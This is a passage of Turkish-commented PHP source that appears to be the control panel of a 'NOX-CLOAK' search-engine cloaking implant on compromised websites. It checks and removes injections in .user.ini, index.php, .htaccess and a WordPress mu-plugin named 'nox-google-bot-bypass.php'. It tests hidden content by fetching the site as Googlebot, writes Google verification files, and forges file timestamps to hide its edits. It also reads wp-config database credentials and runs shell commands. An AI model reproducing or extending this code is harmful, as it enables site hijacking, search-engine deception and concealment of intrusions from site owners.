  if($_SERVER['REQUEST_METHOD']!=='POST'){while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");echo json_encode(['ok'=>false,'error'=>'POST gerekli'],JSON_UNESCAPED_UNICODE);exit;}
  $res=[];
  $lockPath=$DIR.'/.render-cache/render.lock';
  if(file_exists($lockPath)){
    $ok=@unlink($lockPath);
    $res['lock']=$ok?['s'=>'ok','m'=>'render.lock silindi — cloak devre dışı']:['s'=>'err','m'=>'render.lock silinemedi'];
  }else{
    $res['lock']=['s'=>'na','m'=>'render.lock zaten yok'];
  }
  while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");
  echo json_encode($res,JSON_UNESCAPED_UNICODE);exit;
}

// ---- Action: uninstall ----
if($a==="uninstall"){
  if($_SERVER['REQUEST_METHOD']!=='POST'){while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");echo json_encode(['ok'=>false,'error'=>'POST gerekli'],JSON_UNESCAPED_UNICODE);exit;}
  $res=[];
  // render.lock
  $lockPath=$DIR.'/.render-cache/render.lock';
  if(file_exists($lockPath)){@unlink($lockPath);$res['lock']=['s'=>'ok','m'=>'render.lock silindi'];}
  else{$res['lock']=['s'=>'na','m'=>'Zaten yok'];}
  // .user.ini
  $uiPath=$DIR.'/.user.ini';
  if(file_exists($uiPath)){
    $uiContent=(string)@file_get_contents($uiPath);
    if(strpos($uiContent,'auto_prepend_file')!==false){
      $uiMt=@filemtime($uiPath);$lines=explode("\n",$uiContent);$filtered=[];
      foreach($lines as $line){if(strpos($line,'auto_prepend_file')===false)$filtered[]=$line;}
      $newUi=rtrim(implode("\n",$filtered),"\n");
      if($newUi===''){@unlink($uiPath);$res['user_ini']=['s'=>'ok','m'=>'Satır kaldırıldı, dosya silindi'];}
      else{$newUi.="\n";$ok=@file_put_contents($uiPath,$newUi);if($ok!==false&&$uiMt)@touch($uiPath,$uiMt);$res['user_ini']=$ok!==false?['s'=>'ok','m'=>'Satır kaldırıldı']:['s'=>'err','m'=>'Yazma başarısız'];}
    }else{$res['user_ini']=['s'=>'na','m'=>'Aktif değil'];}
  }else{$res['user_ini']=['s'=>'na','m'=>'.user.ini yok'];}
  // index.php
  $idxPath=$DIR.'/index.php';
  if(file_exists($idxPath)){
    $idxContent=(string)@file_get_contents($idxPath);
    if(strpos($idxContent,'NOX-CLOAK-START')!==false){
      $idxMt=@filemtime($idxPath);
      $idxClean=preg_replace('/\n\/\* NOX-CLOAK-START \*\/.*?\/\* NOX-CLOAK-END \*\/\n/s','',$idxContent);
      $ok=@file_put_contents($idxPath,$idxClean);if($ok!==false&&$idxMt)@touch($idxPath,$idxMt);
      $res['index']=$ok!==false?['s'=>'ok','m'=>'Blok kaldırıldı']:['s'=>'err','m'=>'Yazma başarısız'];
    }else{$res['index']=['s'=>'na','m'=>'Aktif değil'];}
  }else{$res['index']=['s'=>'na','m'=>'index.php yok'];}
  // .htaccess
  $htPath=$DIR.'/.htaccess';
  if(file_exists($htPath)){
    $htContent=(string)@file_get_contents($htPath);
    if(strpos($htContent,'NOX-HT-START')!==false){
      $htMt=@filemtime($htPath);
      $htClean=preg_replace('/\n?# NOX-HT-START.*?# NOX-HT-END\n?/s','',$htContent);
      $ok=@file_put_contents($htPath,$htClean);if($ok!==false&&$htMt)@touch($htPath,$htMt);
      $res['htaccess']=$ok!==false?['s'=>'ok','m'=>'Satır kaldırıldı']:['s'=>'err','m'=>'Yazma başarısız'];
    }else{$res['htaccess']=['s'=>'na','m'=>'Aktif değil'];}
  }else{$res['htaccess']=['s'=>'na','m'=>'.htaccess yok'];}
  // mu-plugin
  $cms=nox_detect_cms($DIR);$files=nox_file_names($cms);$wpDir=nox_find_wp_path($DIR);
  $muPath=($wpDir?:$DIR).'/wp-content/mu-plugins/nox-google-bot-bypass.php';
  if(file_exists($muPath)){$ok=@unlink($muPath);$res['mu_plugin']=$ok?['s'=>'ok','m'=>'mu-plugin silindi']:['s'=>'err','m'=>'mu-plugin silinemedi'];}
  else{$res['mu_plugin']=['s'=>'na','m'=>'Zaten yok'];}
  // prepend PHP
  $prependPath=$DIR.'/'.$files['prepend'];
  if(file_exists($prependPath)){$ok=@unlink($prependPath);$res['prepend']=$ok?['s'=>'ok','m'=>'Prepend dosyası silindi']:['s'=>'err','m'=>'Prepend dosyası silinemedi'];}
  else{$res['prepend']=['s'=>'na','m'=>'Zaten yok'];}
  // content HTML
  $contentPath=nox_content_path($DIR,$files['content']);
  if(file_exists($contentPath)){$ok=@unlink($contentPath);$res['content']=$ok?['s'=>'ok','m'=>'Content dosyası silindi']:['s'=>'err','m'=>'Content dosyası silinemedi'];}
  else{$res['content']=['s'=>'na','m'=>'Zaten yok'];}
  while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");
  echo json_encode($res,JSON_UNESCAPED_UNICODE);exit;
}

// ---- Action: checkcloak ----
if($a==="checkcloak"){
  $uiC=file_exists($DIR.'/.user.ini')?(string)@file_get_contents($DIR.'/.user.ini'):'';
  $idxC=file_exists($DIR.'/index.php')?(string)@file_get_contents($DIR.'/index.php'):'';
  $htC=file_exists($DIR.'/.htaccess')?(string)@file_get_contents($DIR.'/.htaccess'):'';
  $v1=strpos($uiC,'auto_prepend_file')!==false;
  $v2=strpos($idxC,'NOX-CLOAK-START')!==false;
  $v3=(bool)preg_match('/NOX-HT-START/',$htC);
  $cms=nox_detect_cms($DIR);$wpDir=nox_find_wp_path($DIR);
  $muPath=($wpDir?:$DIR).'/wp-content/mu-plugins/nox-google-bot-bypass.php';
  $muC=file_exists($muPath)?(string)@file_get_contents($muPath):'';
  $v4=strpos($muC,'NOX-CLOAK-START')!==false;
  $installed=($v1||$v2||$v3||$v4);
  $locked=file_exists($DIR.'/.render-cache/render.lock');
  // Cloak "aktif" = en az bir vektör kurulu VE render.lock mevcut
  while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");
  echo json_encode(['active'=>($installed&&$locked),'installed'=>$installed,'locked'=>$locked,'v1'=>$v1,'v2'=>$v2,'v3'=>$v3,'v4'=>$v4],JSON_UNESCAPED_UNICODE);exit;
}

// ---- Action: botcheck ----
if($a==="botcheck"){
  $scheme=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
  $host=$_SERVER['HTTP_HOST'];$url=$scheme.'://'.$host.'/';
  if(!function_exists('curl_init')){
    while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");
    echo json_encode(['error'=>'cURL bu sunucuda aktif değil.']);exit;
  }
  $_px=['HTTPS_PROXY','HTTP_PROXY','ALL_PROXY','https_proxy','http_proxy','all_proxy'];$_pxb=[];
  foreach($_px as $_pk){$_pxb[$_pk]=(string)getenv($_pk);putenv($_pk.'=');}
  $ch=curl_init();
  curl_setopt_array($ch,[
    CURLOPT_URL=>$url,CURLOPT_RETURNTRANSFER=>true,
    CURLOPT_USERAGENT=>'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    CURLOPT_TIMEOUT=>15,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>5,
    CURLOPT_SSL_VERIFYPEER=>true,CURLOPT_SSL_VERIFYHOST=>2,CURLOPT_NOPROXY=>'*',
    CURLOPT_HTTPHEADER=>['Accept: text/html,application/xhtml+xml,*/*','Accept-Language: en-US,en;q=0.9'],
  ]);
  $body=(string)curl_exec($ch);$httpCode=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
  $finalUrl=curl_getinfo($ch,CURLINFO_EFFECTIVE_URL);$curlErr=curl_error($ch);curl_close($ch);
  foreach($_px as $_pk){if($_pxb[$_pk]!=='')putenv($_pk.'='.$_pxb[$_pk]);}
  $files=nox_file_names(nox_detect_cms($DIR));
  $htmlPath=nox_content_path($DIR,$files['content']);
  $htmlContent=file_exists($htmlPath)?(string)@file_get_contents($htmlPath):'';
  $htmlText=trim(strip_tags($htmlContent));$bodyText=trim(strip_tags($body));$matched=false;
  if($htmlText!==''&&strlen($htmlText)>=10){$needle=_nox_sub($htmlText,0,120);$matched=(strpos($bodyText,$needle)!==false);}
  $uiC=file_exists($DIR.'/.user.ini')?(string)@file_get_contents($DIR.'/.user.ini'):'';
  $idxC=file_exists($DIR.'/index.php')?(string)@file_get_contents($DIR.'/index.php'):'';
  $v1Active=strpos($uiC,'auto_prepend_file')!==false;
  $v2Active=strpos($idxC,'NOX-CLOAK-START')!==false;
  $preview=_nox_sub($body,0,800);
  if(function_exists('iconv'))$preview=(string)@iconv('UTF-8','UTF-8//IGNORE',$preview);
  $out=json_encode(['url'=>$url,'final_url'=>$finalUrl,'http_code'=>$httpCode,'curl_error'=>$curlErr,
    'matched'=>$matched,'html_empty'=>($htmlContent===''),'user_ini_only'=>($v1Active&&!$v2Active),'preview'=>$preview],JSON_UNESCAPED_UNICODE);
  if($out===false)$out=json_encode(['url'=>$url,'http_code'=>$httpCode,'matched'=>$matched,'html_empty'=>($htmlContent===''),'curl_error'=>$curlErr,'user_ini_only'=>false,'preview'=>'(kodlanamadı)']);
  while(ob_get_level()>0)ob_end_clean();header("Content-Type:application/json");echo $out;exit;
}

// ---- Action: raw ----
if($a==="raw"){
  $files=nox_file_names(nox_detect_cms($DIR));
  $name=b64url_decode(isset($_GET["b"])?$_GET["b"]:'');
  if(!safe_name($name)||$name!==$files['content'])die("Forbidden");
  $target=nox_content_path($DIR,$name);
  while(ob_get_level()>0)ob_end_clean();
  header("Content-Type:text/plain;charset=utf-8");header("X-Body-Encoding: base64");
  header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");header("Pragma: no-cache");
  echo base64_encode((string)@file_get_contents($target));exit;
}

// ---- Action: savehtml ----
if($a==="savehtml"){
  $files=nox_file_names(nox_detect_cms($DIR));
  $target=nox_content_path($DIR,$files['content']);
  $d=isset($_POST["d"])?$_POST["d"]:'';$bin=@hex2bin($d);
  while(ob_get_level()>0)ob_end_clean();
  if($bin===false){echo"ERR: bozuk veri";exit;}
  if(strpos($bin,'<?')!==false){echo"ERR: PHP etiketi içeremez";exit;}
  $ok=@file_put_contents($target,$bin);echo $ok!==false?'OK':'ERR';exit;
}

// ---- Action: viewperde ----
if($a==="viewperde"){
  $files=nox_file_names(nox_detect_cms($DIR));
  $target=nox_content_path($DIR,$files['content']);
  if(!file_exists($target)){while(ob_get_level()>0)ob_end_clean();http_response_code(404);echo"Perde dosyası bulunamadı.";exit;}
  while(ob_get_level()>0)ob_end_clean();
  header("Content-Type:text/html;charset=UTF-8");
  header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
  header("Pragma: no-cache");
  @readfile($target);exit;
}

// ---- Action: writegoogle ----
if($a==="writegoogle"){
  $name=b64url_decode(isset($_POST["b"])?$_POST["b"]:(isset($_GET["b"])?$_GET["b"]:''));
  while(ob_get_level()>0)ob_end_clean();
  if(!safe_name($name)||!is_google_file($name)){echo"Forbidden";exit;}
  $d=isset($_POST["d"])?$_POST["d"]:'';$bin=@hex2bin($d);
  if($bin===false){echo"ERR: bozuk veri";exit;}
  if(!preg_match('/^google-site-verification:\s*[A-Za-z0-9_\-\.]+\s*$/',trim($bin))){echo"ERR: Yalnızca 'google-site-verification: TOKEN' formatı kabul edilir";exit;}
  $ok=@file_put_contents($DIR.DIRECTORY_SEPARATOR.$name,$bin);echo $ok!==false?'OK':'ERR';exit;
}

// ---- Action: rmgoogle ----
if($a==="rmgoogle"){
  $name=b64url_decode(isset($_GET["b"])?$_GET["b"]:(isset($_POST["b"])?$_POST["b"]:''));
  while(ob_get_level()>0)ob_end_clean();
  if(!safe_name($name)||!is_google_file($name)){echo"Forbidden";exit;}
  echo @unlink($DIR.DIRECTORY_SEPARATOR.$name)?'OK':'ERR';exit;
}

// ---- Action: clearcache ----
if($a==="clearcache"){
  @set_time_limit(20);@ignore_user_abort(true);
  $GLOBALS['_cc_deadline']=microtime(true)+8.0;
  $res=[];$cms=nox_detect_cms($DIR);
  // OPcache
  if(function_exists('opcache_get_status')&&@opcache_get_status()!==false){
    $ok=@opcache_reset();
    if(function_exists('opcache_invalidate')){
      foreach([$DIR.'/index.php',$DIR.'/.user.ini'] as $_oit){if(file_exists($_oit))@opcache_invalidate($_oit,true);}
      if($cms==='wordpress'){
        foreach([$DIR.'/wp-blog-header.php',$DIR.'/wp-content/mu-plugins/nox-google-bot-bypass.php'] as $_oit){if(file_exists($_oit))@opcache_invalidate($_oit,true);}
      }
    }
    $res['opcache']=$ok?['s'=>'ok','m'=>'Sıfırlandı']:['s'=>'err','m'=>'Sıfırlanamadı'];
  }else{$res['opcache']=['s'=>'na','m'=>'Aktif değil'];}
  // stat cache + realpath cache
  @clearstatcache(true);
  $res['stat_cache']=['s'=>'ok','m'=>'clearstatcache(true) çağrıldı'];
  // PHP-FPM reload
  if(function_exists('shell_exec')){
    $fp=trim((string)@shell_exec('cat /var/run/php-fpm.pid 2>/dev/null'));
    if($fp&&ctype_digit($fp)){@shell_exec("kill -USR2 $fp 2>/dev/null");$res['fpm_reload']=['s'=>'ok','m'=>"PID $fp — USR2 gönderildi"];}
    else{$res['fpm_reload']=['s'=>'na','m'=>'FPM pid bulunamadı'];}
  }else{$res['fpm_reload']=['s'=>'na','m'=>'shell_exec devre dışı'];}
  // APC
  if(function_exists('apc_clear_cache')){@apc_clear_cache();@apc_clear_cache('user');$res['apc']=['s'=>'ok','m'=>'Temizlendi'];}
  else{$res['apc']=['s'=>'na','m'=>'Yok'];}
  // Memcache
  if(class_exists('Memcache')){try{$mc=new Memcache();$mcOk=false;
    foreach([['127.0.0.1',11211],['localhost',11211]] as $_mcp){$mh=$_mcp[0];$mp=$_mcp[1];if(@$mc->connect($mh,$mp)){$mc->flush();$mc->close();$mcOk=true;break;}}
    $res['memcache']=$mcOk?['s'=>'ok','m'=>'Temizlendi']:['s'=>'na','m'=>'Bağlantı kurulamadı'];
  }catch(Exception $ex){$res['memcache']=['s'=>'err','m'=>$ex->getMessage()];}}
  else{$res['memcache']=['s'=>'na','m'=>'Extension yok'];}
  // Memcached
  if(class_exists('Memcached')){try{$mcd=new Memcached();$mcd->addServer('127.0.0.1',11211);
    $res['memcached']=$mcd->flush()?['s'=>'ok','m'=>'Temizlendi']:['s'=>'na','m'=>'Bağlantı başarısız'];
  }catch(Exception $ex){$res['memcached']=['s'=>'err','m'=>$ex->getMessage()];}}
  else{$res['memcached']=['s'=>'na','m'=>'Extension yok'];}
  // Redis
  if(class_exists('Redis')){try{$redis=new Redis();$redisOk=false;
    foreach([6379,6380] as $rp){if(@$redis->connect('127.0.0.1',$rp,2)){$redis->flushDB();$redis->close();$res['redis']=['s'=>'ok','m'=>"Temizlendi (port $rp)"];$redisOk=true;break;}}
    if(!$redisOk)$res['redis']=['s'=>'na','m'=>'Bağlantı kurulamadı'];
  }catch(Exception $ex){$res['redis']=['s'=>'err','m'=>$ex->getMessage()];}}
  else{$res['redis']=['s'=>'na','m'=>'Extension yok'];}
  // CMS-spesifik disk cache
  if($cms==='joomla'){
    foreach(['joomla_cache'=>[$DIR.'/cache/','Joomla Frontend Cache'],'joomla_admin'=>[$DIR.'/administrator/cache/','Joomla Admin Cache'],'joomla_tmp'=>[$DIR.'/tmp/','Joomla Tmp']] as $k=>$d){
      if(is_dir($d[0])){$n=_cc_rmdir($d[0]);$res[$k]=['s'=>'ok','m'=>$d[1].": $n dosya silindi"];}else{$res[$k]=['s'=>'na','m'=>$d[1].': dizin yok'];}
    }
  }elseif($cms==='wordpress'){
    $_wpDir=nox_find_wp_path($DIR);
    if(!$_wpDir){$res['wp_path']=['s'=>'warn','m'=>'WP dizini tespit edilemedi'];$_wpDir=$DIR;}
    else{$res['wp_path']=['s'=>'ok','m'=>'WP dizini: '.$_wpDir];}
    // WP disk cache dizinleri
    $wpc=$_wpDir.'/wp-content/cache';
    if(is_dir($wpc)){$cn=_cc_rmdir($wpc);$res['wp_cache']=['s'=>'ok','m'=>"$cn dosya silindi"];}else{$res['wp_cache']=['s'=>'na','m'=>'wp-content/cache/ yok'];}
    foreach(['dir_w3tc'=>[$_wpDir.'/wp-content/w3tc-cache/','W3 Total Cache'],'dir_wprocket'=>[$_wpDir.'/wp-content/wp-rocket-cache/','WP Rocket'],
             'dir_litespeed'=>[$_wpDir.'/wp-content/litespeed/','LiteSpeed'],'dir_autoptimize'=>[$_wpDir.'/wp-content/cache/autoptimize/','Autoptimize'],
             'dir_endurance'=>[$_wpDir.'/wp-content/endurance-page-cache/','Endurance'],'dir_wpfastest'=>[$_wpDir.'/wp-content/uploads/wp-fastest-cache/','WP Fastest Cache'],
             'dir_comet'=>[$_wpDir.'/wp-content/cache/comet-cache/','Comet Cache'],'dir_enabler'=>[$_wpDir.'/wp-content/cache/cache-enabler/','Cache Enabler'],
             'dir_supercache'=>[$_wpDir.'/wp-content/cache/supercache/','WP Super Cache'],'dir_sgcache'=>[$_wpDir.'/wp-content/cache/siteground-optimizer-assets/','SG Optimizer']] as $k=>$d){
      if(is_dir($d[0])){$pn=_cc_rmdir($d[0]);$res[$k]=['s'=>'ok','m'=>$d[1].": $pn dosya silindi"];}else{$res[$k]=['s'=>'na','m'=>$d[1].': dizin yok'];}
    }
    // WP transient + rewrite_rules — doğrudan SQL (wp-load.php yüklenmez)
    $_wcfgPath=nox_find_wpconfig($_wpDir);
    if($_wcfgPath){
      $_wcfg=nox_parse_wpconfig($_wcfgPath);
      if(!empty($_wcfg['creds']['DB_NAME'])){
        $_wdb=nox_db_connect($_wcfg['creds']);
        if($_wdb){
          $_wpfx=$_wcfg['prefix'];
          $_wtr=@$_wdb->query("DELETE FROM `{$_wpfx}options` WHERE option_name LIKE '\\_transient\\_%' OR option_name LIKE '\\_site\\_transient\\_%'");
          $_wtrDel=$_wtr!==false?$_wdb->affected_rows:0;
          $_wdb->query("DELETE FROM `{$_wpfx}options` WHERE option_name='rewrite_rules'");
          $_wdb->close();
          $res['wp_db_cache']=['s'=>'ok','m'=>"$_wtrDel transient + rewrite_rules silindi (SQL)"];
        }else{$res['wp_db_cache']=['s'=>'na','m'=>'DB bağlantı kurulamadı'];}
      }
    }else{$res['wp_db_cache']=['s'=>'na','m'=>'wp-config.php bulunamadı'];}
    // WP plugin API'leri — sadece zaten yüklüyse çalışır (wp-load.php yüklenmez)
    $_wpfn=[];
    if(function_exists('wp_cache_flush')){@wp_cache_flush();$_wpfn[]='wp_cache_flush';}
    if(function_exists('rocket_clean_domain')){@rocket_clean_domain();$_wpfn[]='wp_rocket';}
    if(function_exists('w3tc_flush_all')){@w3tc_flush_all();$_wpfn[]='w3tc';}
    if(function_exists('wp_cache_clear_cache')){@wp_cache_clear_cache();$_wpfn[]='wp_super_cache';}
    if(class_exists('WpFastestCache')){try{$_wpfc=new WpFastestCache();@$_wpfc->deleteCache(true);$_wpfn[]='wp_fastest';}catch(Exception $_e){}}
    if(class_exists('autoptimizeCache')){try{@autoptimizeCache::clearall();$_wpfn[]='autoptimize';}catch(Exception $_e){}}
    if(class_exists('Cache_Enabler')){try{@Cache_Enabler::clear_total_cache();$_wpfn[]='cache_enabler';}catch(Exception $_e){}}
    if(class_exists('comet_cache')){try{@comet_cache::clear();$_wpfn[]='comet';}catch(Exception $_e){}}
    if(function_exists('sg_cachepress_purge_cache')){@sg_cachepress_purge_cache();$_wpfn[]='sg_optimizer';}
    if(function_exists('do_action')){
      @do_action('litespeed_purge_all');@do_action('litespeed_purge_object');@do_action('wphb_clear_page_cache');
      $_wpfn[]='hooks(litespeed+hummingbird)';
    }
    if(!empty($_wpfn))$res['wp_plugin_purge']=['s'=>'ok','m'=>implode(', ',$_wpfn)];
    // WP-CLI LiteSpeed (shell_exec mevcutsa)
    $_wpCli='';foreach(['/usr/local/bin/wp','/usr/bin/wp','/bin/wp'] as $_wp){if(@file_exists($_wp)){$_wpCli=$_wp;break;}}
    if($_wpCli&&function_exists('shell_exec')){$wcout=trim((string)@shell_exec("cd ".escapeshellarg($_wpDir)." && $_wpCli litespeed-purge all --allow-root 2>&1"));$res['litespeed_wpcli']=['s'=>'ok','m'=>$wcout?:'Çalıştırıldı'];}
    elseif(!$_wpCli){$res['litespeed_wpcli']=['s'=>'na','m'=>'WP-CLI bulunamadı'];}
    else{$res['litespeed_wpcli']=['s'=>'na','m'=>'shell_exec devre dışı'];}
  }elseif($cms==='laravel'){
    $_lvRoot=dirname($DIR);
    $bcDir=$_lvRoot.'/bootstrap/cache';
    if(is_dir($bcDir)){$bcCnt=0;foreach((array)@glob($bcDir.'/*.php') as $_bcf){if(@unlink($_bcf))$bcCnt++;}$res['laravel_bootstrap']=['s'=>'ok','m'=>"bootstrap/cache: $bcCnt php silindi"];}
    else{$res['laravel_bootstrap']=['s'=>'na','m'=>'bootstrap/cache dizini yok'];}
    $sfData=$_lvRoot.'/storage/framework/cache/data';
    if(is_dir($sfData)){$sfCnt=_cc_rmdir($sfData);$res['laravel_storage_cache']=['s'=>'ok','m'=>"storage/framework/cache/data: $sfCnt dosya silindi"];}
    else{$res['laravel_storage_cache']=['s'=>'na','m'=>'storage/framework/cache/data yok'];}
    $sfViews=$_lvRoot.'/storage/framework/views';
    if(is_dir($sfViews)){$vCnt=0;foreach((array)@glob($sfViews.'/*.php') as $_vf){if(@unlink($_vf))$vCnt++;}$res['laravel_views']=['s'=>'ok','m'=>"compiled views: $vCnt php silindi"];}
    else{$res['laravel_views']=['s'=>'na','m'=>'storage/framework/views yok'];}
    $artisan=$_lvRoot.'/artisan';
    if(file_exists($artisan)&&function_exists('shell_exec')){$out=trim((string)@shell_exec('cd '.escapeshellarg($_lvRoot).' && php artisan optimize:clear 2>&1'));$res['laravel_artisan']=['s'=>'ok','m'=>$out?:'optimize:clear çalıştırıldı'];}
    else{$res['laravel_artisan']=['s'=>'na','m'=>'artisan bulunamadı veya shell_exec kapalı'];}
  }else{
    foreach(['generic_cache'=>[$DIR.'/cache/','Cache'],'generic_tmp'=>[$DIR.'/tmp/','Tmp']] as $k=>$d){
      if(is_dir($d[0])){$gn=_cc_rmdir($d[0]);$res[$k]=['s'=>'ok','m'=>$d[1].": $gn dosya silindi"];}else{$res[$k]=['s'=>'na','m'=>$d[1].': dizin yok'];}
    }
  }
  // LiteSpeed sunucu seviyesi — plugin olmadan çalışır (Hostinger/shared host'ların çoğu LSWS)
  $srv=strtolower(isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'');
  if(strpos($srv,'litespeed')!==false||strpos($srv,'lsws')!==false){
    if(!headers_sent()){
      header('X-LiteSpeed-Purge: *',true);
      $res['litespeed_server']=['s'=>'ok','m'=>'X-LiteSpeed-Purge: * gönderildi (sunucu seviyesi)'];
    }else{$res['litespeed_server']=['s'=>'na','m'=>'Header zaten gönderilmiş'];}
    // HTTP PURGE method (LiteSpeed native — LSCWP plugin gerektirmez)
    if(function_exists('curl_init')){
      $pSch=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
      $pUrl=$pSch.'://'.$_SERVER['HTTP_HOST'].'/';
      $pCh=curl_init($pUrl);
      curl_setopt_array($pCh,[CURLOPT_CUSTOMREQUEST=>'PURGE',CURLOPT_HTTPHEADER=>['X-LiteSpeed-Purge: *'],
        CURLOPT_RETURNTRANSFER=>true,CURLOPT_HEADER=>true,CURLOPT_NOBODY=>true,
        CURLOPT_CONNECTTIMEOUT=>3,CURLOPT_TIMEOUT=>5,CURLOPT_SSL_VERIFYPEER=>true,CURLOPT_SSL_VERIFYHOST=>2,CURLOPT_FOLLOWLOCATION=>false]);
      $pResp=(string)curl_exec($pCh);$pCode=(int)curl_getinfo($pCh,CURLINFO_HTTP_CODE);curl_close($pCh);
      $purged=($pCode===200&&stripos($pResp,'Purged')!==false);
      $res['litespeed_http_purge']=['s'=>$purged?'ok':'na','m'=>'HTTP PURGE /: '.$pCode.($purged?' (Purged)':'')];
    }
  }else{$res['litespeed_server']=['s'=>'na','m'=>'LiteSpeed tespit edilmedi'];}
  // Aruba CDN
  if(function_exists('curl_init')){
    $hh=$_SERVER['HTTP_HOST'];$ch=curl_init('http://127.0.0.1:8889/purge/');
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_HTTPHEADER=>["Host: $hh"],CURLOPT_TIMEOUT=>3,CURLOPT_CONNECTTIMEOUT=>2]);
    curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);$cerr=curl_error($ch);curl_close($ch);
    $res['aruba']=$cerr||$code===0?['s'=>'na','m'=>'Port 8889 yanıt vermedi']:['s'=>'ok','m'=>"Purge (HTTP $code)"];
  }else{$res['aruba']=['s'=>'na','m'=>'cURL yok'];}
  // Varnish — sadece port 6081 (native Varnish portu); 80'e PURGE atmak canlı siteyi etkiler
  $vDone=false;if(function_exists('curl_init')){$hh=$_SERVER['HTTP_HOST'];
    foreach([6081] as $vp){$ch=curl_init("http://127.0.0.1:$vp/");
      curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_CUSTOMREQUEST=>'PURGE',CURLOPT_HTTPHEADER=>["Host: $hh","X-Purge-Method: default"],CURLOPT_TIMEOUT=>2,CURLOPT_CONNECTTIMEOUT=>2]);
      curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);$cerr=curl_error($ch);curl_close($ch);
      if(!$cerr&&$code>0){$res['varnish']=['s'=>'ok','m'=>"PURGE port $vp → HTTP $code"];$vDone=true;break;}
    }
    if(!$vDone)$res['varnish']=['s'=>'na','m'=>'Varnish tespit edilmedi'];
  }else{$res['varnish']=['s'=>'na','m'=>'cURL yok'];}
  // Nginx FastCGI Cache
  $nxF=false;
  foreach(['/var/cache/nginx/','/tmp/nginx-cache/','/dev/shm/nginx-cache/',$DIR.'/.nginx-cache/'] as $nd){
    if(is_dir($nd)&&is_writable($nd)){$nn=_cc_rmdir($nd);$res['nginx_cache']=['s'=>'ok','m'=>"Nginx cache: $nn dosya ($nd)"];$nxF=true;break;}
  }
  if(!$nxF)$res['nginx_cache']=['s'=>'na','m'=>'Nginx cache dizini yok'];
  // Managed host (WP Engine / Kinsta / Pantheon / Cloudways) — PHP API varsa sessizce temizle
  $mhPurged=[];
  if(class_exists('WpeCommon')){
    try{if(method_exists('WpeCommon','purge_varnish_cache'))@WpeCommon::purge_varnish_cache();}catch(Exception $_e){}
    try{if(method_exists('WpeCommon','purge_memcached'))@WpeCommon::purge_memcached();}catch(Exception $_e){}
    $mhPurged[]='WP Engine';
  }
  if(class_exists('Kinsta\\Cache')&&method_exists('Kinsta\\Cache','purge_complete_caches')){
    try{$_ki=new Kinsta\Cache();@$_ki->purge_complete_caches();}catch(Exception $_e){}
    $mhPurged[]='Kinsta';
  }
  if(function_exists('do_action'))@do_action('kinsta_cache_purge_all');
  if(function_exists('pantheon_clear_edge_all')){try{@pantheon_clear_edge_all();}catch(Exception $_e){} $mhPurged[]='Pantheon';}
  if(function_exists('do_action')){@do_action('breeze_clear_all_cache');if(defined('BREEZE_VERSION'))$mhPurged[]='Cloudways';}
  $res['managed_host']=empty($mhPurged)?['s'=>'na','m'=>'Managed host tespit edilmedi']:['s'=>'ok','m'=>implode(', ',$mhPurged).' temizlendi'];
  // .htaccess tarama
  if(file_exists($DIR.'/.htaccess')){
    $ht=(string)@file_get_contents($DIR.'/.htaccess');$warns=[];
    if(preg_match('/ExpiresActive\s+On|ExpiresByType/i',$ht))$warns[]='mod_expires';
    if(preg_match('/W3TC|W3 Total Cache/i',$ht))$warns[]='W3TC';
    if(preg_match('/LiteSpeed/i',$ht))$warns[]='LiteSpeed';
    if(preg_match('/max-age\s*=\s*[1-9][0-9]{2,}/i',$ht))$warns[]='max-age';
    $res['htaccess']=$warns?['s'=>'warn','m'=>'Dikkat: '.implode(', ',$warns).' tespit edildi']:['s'=>'ok','m'=>'Sorunlu kural yok'];
  }else{$res['htaccess']=['s'=>'na','m'=>'.htaccess yok'];}
  // Warmup
  if(function_exists('curl_init')){
    $wSch=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off')?'https':'http';
    $wUrl=$wSch.'://'.$_SERVER['HTTP_HOST'].'/';
    foreach(['warmup_desktop'=>'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
             'warmup_mobile'=>'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36'] as $wk=>$wua){
      $wch=curl_init();
      curl_setopt_array($wch,[CURLOPT_URL=>$wUrl,CURLOPT_RETURNTRANSFER=>true,CURLOPT_USERAGENT=>$wua,CURLOPT_TIMEOUT=>10,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>3,CURLOPT_SSL_VERIFYPEER=>true,CURLOPT_SSL_VERIFYHOST=>2,CURLOPT_HTTPHEADER=>['Accept: text/html,*/*','Accept-Language: tr-TR,tr;q=0.9,en;q=0.8']]);
      curl_exec($wch);$wc=(int)curl_getinfo($wch,CURLINFO_HTTP_CODE);$we=curl_error($wch);curl_close($wch);
      $res[$wk]=$we?['s'=>'err','m'=>'Warmup hatası: '.$we]:['s'=>'ok','m'=>"HTTP $wc → $wUrl"];
    }
  }else{$res['warmup_desktop']=['s'=>'na','m'=>'cURL yok'];$res['warmup_mobile']=['s'=>'na','m'=>'cURL yok'];}
  while(ob_get_level()>0)ob_end_clean();
  $out=json_encode($res,JSON_UNESCAPED_UNICODE);
